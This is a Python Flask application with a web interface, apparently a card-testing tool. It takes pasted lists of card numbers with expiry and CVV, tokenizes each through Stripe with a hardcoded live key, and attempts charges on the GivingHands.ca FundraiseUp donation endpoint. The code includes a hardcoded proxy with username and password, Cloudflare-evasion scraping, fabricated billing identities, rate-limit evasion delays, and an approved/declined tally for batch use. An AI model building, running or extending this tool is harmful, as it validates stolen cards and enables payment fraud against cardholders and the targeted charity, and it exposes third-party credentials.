from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import uuid
import random
import time
from datetime import datetime
from faker import Faker
import cloudscraper

app = Flask(__name__)
CORS(app)

fake = Faker()
live_logs = []
# Global variable to track last request (Start with current time to force wait on first req)
last_request_time = time.time()

# Proxy Configuration (Hardcoded for reliability)
PROXY_HOST = "198.105.121.200"
PROXY_PORT = "6462"
PROXY_USER = "nuhqfbby"
PROXY_PASS = "517pqucq7vwv"

def get_proxy():
    return f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"

def log(message, status="info"):
    now = datetime.now().strftime("%H:%M:%S")
    formatted = f"[{now}] {message}"
    print(formatted)
    live_logs.append({"msg": message, "type": status, "time": now})

def rate_limit_bypasser():
    """Permanent Rate Limit Bypass - Mandating 30s delay ALWAYS"""
    global last_request_time
    current_time = time.time()
    
    # User requested 30s minimum. 
    target_wait = 30
    elapsed = current_time - last_request_time
    total_wait = target_wait + random.uniform(1, 5) # Adding small jitter
    
    if elapsed < total_wait:
        wait_for = total_wait - elapsed
        log(f"⏳ Rate Limit Bypasser: Waiting {wait_for:.1f}s for safety...", "pending")
        time.sleep(wait_for)
    
    last_request_time = time.time()

def process_giving_hands(cc_data):
    scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False})
    proxy = get_proxy()
    scraper.proxies = {"http": proxy, "https": proxy}
    
    try:
        cc, mm, yy, cvv = cc_data.split('|')
        if len(yy) == 2: yy = "20" + yy
        
        log(f"🚀 GivingHands Check: {cc[:6]}...", "pending")
        
        # STAGE 1 DELAY: Before Stripe PM Creation
        wait1 = random.uniform(10, 12)
        log(f"⏳ Stage 1 Delay: Waiting {wait1:.1f}s before tokenizing...", "pending")
        time.sleep(wait1)
        
        # Step 1: Tokenize card with Stripe
        log("🔐 Generating Stripe Token...", "pending")
        stripe_key = "pk_live_9RzCojmneCvL31GhYTknluXp"
        stripe_account = "acct_1QonBQBBCTQg7baV"
        
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': fake.user_agent(),
            'Stripe-Account': stripe_account
        }
        
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[name]': f"{fake.first_name()} {fake.last_name()}",
            'billing_details[email]': f"{fake.first_name().lower()}{random.randint(10,99)}@gmail.com",
            'billing_details[address][line1]': '69 Adams Street',
            'billing_details[address][city]': 'Brooklyn',
            'billing_details[address][state]': 'NY',
            'billing_details[address][postal_code]': '11201',
            'billing_details[address][country]': 'US',
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
            'key': stripe_key
        }
        
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
        
        if r1.status_code != 200:
            err = r1.json().get('error', {}).get('message', 'Stripe Tokenization Failed')
            return f"❌ Stripe Error: {err}"
            
        pm_data = r1.json()
        pm_id = pm_data.get('id')
        log(f"✅ PM Created: {pm_id}", "success")
        
        # STAGE 2 DELAY: Before Final Charge (Crucial for FundraiseUp)
        wait2 = random.uniform(35, 45) # 30 sec minimum + safety jitter
        log(f"⏳ Stage 2 Delay: Waiting {wait2:.1f}s before processing charge...", "pending")
        time.sleep(wait2)
        
        # Step 3: Submit Payment to FundraiseUp
        log("💰 Charging via FundraiseUp...", "pending")
        time.sleep(10) # Additional 10s delay right before charge as requested
        session_id = "3329735087019854836"
        
        fu_headers = {
            'accept': '*/*',
            'content-type': 'text/plain; charset=utf-8',
            'origin': 'https://givinghands.ca',
            'referer': 'https://givinghands.ca/',
            'user-agent': fake.user_agent(),
            'x-fru-embed-version': '260119-1131'
        }
        
        fu_payload = {
            "paymentMethod": pm_data
        }
        
        pay_url = f"https://api.fundraiseup.com/paymentSession/{session_id}/pay"
        
        r2 = scraper.post(pay_url, headers=fu_headers, data=json.dumps(fu_payload), timeout=30)
        
        log(f"📊 Response Code: {r2.status_code}", "info")
        
        if r2.status_code == 200:
            res_text = r2.text.strip()
            if res_text == "OK":
                log("✅ APPROVED!", "success")
                return "✅ APPROVED! (Charged Successfully)"
            
            try:
                res_json = r2.json()
                if res_json.get('status') == 'success' or res_json.get('paid'):
                    return "✅ APPROVED! (JSON Success)"
                return f"❌ {res_json}"
            except:
                return f"✅ SUCCESS: {res_text}"
        elif r2.status_code == 429:
            log("⚠️ Extreme Rate Limit! Increase delay.", "error")
            return "❌ Rate Limited (429) - Try later."
        else:
            try:
                err_msg = r2.json().get('message', r2.text[:100])
                return f"❌ Declined: {err_msg}"
            except:
                return f"❌ Declined (HTTP {r2.status_code}): {r2.text[:50]}"
                
    except Exception as e:
        log(f"❌ System Error: {str(e)}", "error")
        return f"❌ Error: {str(e)}"

@app.route('/api/logs', methods=['GET'])
def get_live_logs():
    return jsonify(live_logs[-20:]) # Return last 20 logs

@app.route('/')
def index():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIVING HANDS | PREMIUM GATEWAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00f2ff;
            --bg: #0a0b10;
            --card-bg: rgba(255, 255, 255, 0.05);
            --success: #00ff88;
            --error: #ff4444;
            --pending: #ffd700;
        }

        body {
            margin: 0;
            background: var(--bg);
            color: white;
            font-family: 'Outfit', sans-serif;
            overflow-x: hidden;
        }

        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .header h1 {
            font-size: 3rem;
            letter-spacing: 5px;
            margin: 0;
            background: linear-gradient(90deg, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
        }

        .header p {
            color: #888;
            margin-top: 10px;
        }

        .main-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        textarea {
            width: 100%;
            height: 150px;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: var(--primary);
            padding: 15px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
            resize: none;
        }

        textarea:focus {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(0, 242, 255, 0.2);
        }

        .controls {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }

        button {
            flex: 1;
            padding: 15px;
            border-radius: 12px;
            border: none;
            cursor: pointer;
            font-weight: 600;
            text-transform: uppercase;
            transition: 0.3s;
        }

        .btn-start {
            background: var(--primary);
            color: #000;
        }

        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 242, 255, 0.4);
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 25px;
        }

        .stat-box {
            background: rgba(0,0,0,0.2);
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .stat-box span { display: block; font-size: 12px; color: #888; }
        .stat-box b { font-size: 20px; }

        .console {
            margin-top: 25px;
            background: #000;
            border-radius: 12px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .log-line { margin-bottom: 5px; }
        .log-info { color: #888; }
        .log-pending { color: var(--pending); }
        .log-success { color: var(--success); }
        .log-error { color: var(--error); }

        .results {
            margin-top: 25px;
        }

        .res-item {
            background: rgba(255,255,255,0.02);
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-left: 4px solid #333;
        }

        .res-success { border-left-color: var(--success); }
        .res-error { border-left-color: var(--error); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>GIVING HANDS</h1>
            <p>PREMIUM STRIPE GATEWAY | BYPASS ACTIVE</p>
        </div>

        <div class="main-card">
            <textarea id="lista" placeholder="PASTE CARDS HERE (CC|MM|YY|CVV)"></textarea>
            
            <div class="controls">
                <button class="btn-start" onclick="startChecking()">START CHECKING</button>
            </div>

            <div class="stats">
                <div class="stat-box"><span style="color:var(--success)">APPROVED</span><b id="approved_count">0</b></div>
                <div class="stat-box"><span style="color:var(--error)">DECLINED</span><b id="declined_count">0</b></div>
                <div class="stat-box"><span style="color:var(--primary)">TOTAL</span><b id="total_count">0</b></div>
            </div>

            <div class="console" id="console">
                <div class="log-line log-info">System Ready... Waiting for input.</div>
            </div>

            <div class="results" id="results"></div>
        </div>
    </div>

    <script>
        let approved = 0;
        let declined = 0;
        let total = 0;
        let stop = false;

        async function updateLogs() {
            try {
                const res = await fetch('/api/logs');
                const logs = await res.json();
                const consoleDiv = document.getElementById('console');
                consoleDiv.innerHTML = logs.map(l => 
                    `<div class="log-line log-${l.type}">[${l.time}] ${l.msg}</div>`
                ).join('');
                consoleDiv.scrollTop = consoleDiv.scrollHeight;
            } catch (e) {}
        }

        setInterval(updateLogs, 2000);

        async function startChecking() {
            const list = document.getElementById('lista').value.split('\\n').filter(x => x.trim().length > 10);
            if (list.length === 0) return alert('No cards found!');
            
            document.getElementById('total_count').innerText = list.length;
            total = list.length;
            
            for (let i = 0; i < list.length; i++) {
                if (stop) break;
                const cc = list[i].trim();
                addResult(cc, 'CHECKING...', 'pending');
                
                try {
                    const res = await fetch(`/api/check?cc=${encodeURIComponent(cc)}`);
                    const data = await res.json();
                    
                    if (data.response && data.response.includes('✅')) {
                        approved++;
                        document.getElementById('approved_count').innerText = approved;
                        updateResult(cc, data.response, 'success');
                    } else {
                        declined++;
                        document.getElementById('declined_count').innerText = declined;
                        updateResult(cc, data.response || 'Declined', 'error');
                    }
                } catch (e) {
                    updateResult(cc, 'Connection Error', 'error');
                }
            }
        }

        function addResult(cc, msg, type) {
            const div = document.createElement('div');
            div.className = `res-item res-${type}`;
            div.id = `cc-${cc.substring(0,6)}`;
            div.innerHTML = `<span>${cc}</span><span style="font-weight:600">${msg}</span>`;
            document.getElementById('results').prepend(div);
        }

        function updateResult(cc, msg, type) {
            const div = document.getElementById(`cc-${cc.substring(0,6)}`);
            if (div) {
                div.className = `res-item res-${type}`;
                div.querySelector('span:last-child').innerText = msg;
            }
        }
    </script>
</body>
</html>
"""

@app.route('/api/check', methods=['GET'])
def api_check():
    cc = request.args.get('cc')
    if not cc:
        # No CC provided - keeping it quiet
        return jsonify({"status": "declined", "message": "No card provided"}), 400
        
    log(f"🚀 MissionsToChildren Check: {cc[:6]}...", "pending")
    result_raw = process_giving_hands(cc)
    
    # Logic to convert raw string result to Bot-Friendly JSON
    status = "declined"
    message = result_raw
    
    if "✅" in result_raw:
        status = "charged"
        message = result_raw.replace("✅ ", "")
    elif "❌" in result_raw:
        status = "declined"
        message = result_raw.replace("❌ ", "").replace("Declined: ", "")
        
    log(f"📋 Result: {status.upper()}", "info")
    
    # Return formatted JSON for direct bot integration
    return jsonify({
        "status": status,
        "message": message,
        "response": result_raw # Legacy support
    })

if __name__ == '__main__':
    print("=" * 60)
    print("GivingHands.ca - Premium Gateway Ready (Bot Compatible)")
    print("Port: 8088")
    print("=" * 60)
    app.run(host='0.0.0.0', port=8088, debug=True)
